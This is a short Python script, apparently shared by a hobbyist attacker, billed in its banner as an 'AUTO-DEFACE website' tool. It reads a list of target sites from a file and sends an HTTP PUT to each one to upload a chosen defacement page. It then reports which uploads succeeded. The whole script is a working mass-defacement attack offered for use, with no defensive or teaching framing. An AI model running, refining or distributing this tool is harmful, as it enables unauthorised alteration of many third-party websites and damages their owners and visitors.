#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """
    _   _   _ _____ ___        ____  _____ _____ _    ____ _____ 
   / \ | | | |_   _/ _ \      |  _ \| ____|  ___/ \  / ___| ____|
  / _ \| | | | | || | | |_____| | | |  _| | |_ / _ \| |   |  _|  
 / ___ \ |_| | | || |_| |_____| |_| | |___|  _/ ___ \ |___| |___ 
/_/   \_\___/  |_| \___/      |____/|_____|_|/_/   \_\____|_____|

                      _         _ _       
        __      _____| |__  ___(_) |_ ___ 
        \ \ /\ / / _ \ '_ \/ __| | __/ _ \
         \ V  V /  __/ |_) \__ \ | ||  __/
          \_/\_/ \___|_.__/|___/_|\__\___|

Author: Garuda12cyber
github: https://github.com/Garuda12cyber
Youtube: Garuda12cyber
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("https://") is False:
               site = "https://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
